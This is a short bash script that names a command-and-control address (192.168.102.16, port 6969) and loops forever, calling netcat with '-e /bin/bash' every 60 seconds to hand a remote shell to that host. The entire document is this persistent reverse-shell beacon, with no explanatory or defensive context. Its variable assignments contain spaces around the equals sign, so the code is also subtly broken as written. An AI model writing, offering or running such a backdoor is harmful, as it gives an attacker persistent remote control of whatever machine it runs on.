#!/bin/bash
CnC = "192.168.102.16"
port = "6969"
while true
do
nc $CnC $port -e /bin/bash
sleep 60
done